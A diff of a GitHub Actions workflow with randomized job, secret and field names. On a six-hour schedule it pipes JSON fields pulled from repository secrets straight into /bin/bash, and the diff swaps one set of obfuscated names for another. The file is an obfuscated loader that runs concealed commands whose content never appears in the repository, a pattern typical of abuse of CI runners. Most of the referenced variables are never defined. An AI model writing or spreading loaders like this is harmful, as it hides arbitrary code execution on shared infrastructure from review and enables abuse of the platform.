@@ -1,36 +1,23 @@
 name: chenzhishi4567
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 1/6 * * *'
+    - cron: '8 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chenzhishi4567
         env:
-          zdln189: ${{ secrets.zdln189 }}
+          iwl78: ${{ secrets.iwl78 }}
         run: |
-          echo $zdln189 | jq -r .kokd399 | /bin/bash
-          echo $sgn18463 | jq -r .iqyz46 | /bin/bash
-          echo $yg1 | jq -r .gs307 | /bin/bash
-          echo $ww286 | jq -r .wob31 | /bin/bash
-          echo $kzaes6643 | jq -r .dtuxc4387 | /bin/bash
-          echo $iss313 | jq -r .tzwo811 | /bin/bash
-          echo $lsskc054 | jq -r .dsi01502 | /bin/bash
-          echo $asgk5 | jq -r .taer05577 | /bin/bash
-          echo $xehr4 | jq -r .wum76 | /bin/bash
-          echo $zi92 | jq -r .zs6614 | /bin/bash
-          echo $as4 | jq -r .mv3879 | /bin/bash
-          echo $hqliw2799 | jq -r .bmsq965 | /bin/bash
-          echo $r4565 | jq -r .itg5 | /bin/bash
-          echo $hqk8 | jq -r .aimk61637 | /bin/bash
-          echo $jpz23908 | jq -r .tg181 | /bin/bash
-          echo $wzom25 | jq -r .pn2 | /bin/bash
-          echo $axlbw16221 | jq -r .kc0 | /bin/bash
-          echo $szf848 | jq -r .ogb187 | /bin/bash
+          echo $iwl78 | jq -r .u836 | /bin/bash
+          echo $bzoji04784 | jq -r .ecpao846 | /bin/bash
+          echo $anzo4 | jq -r .rcb61 | /bin/bash
+          echo $geycn81189 | jq -r .ymb61754 | /bin/bash
+          echo $ra4136 | jq -r .mqssk8096 | /bin/bash
+          echo $zfwnl4648 | jq -r .ostye9952 | /bin/bash
+          echo $ddstw03165 | jq -r .ul0180 | /bin/bash
 
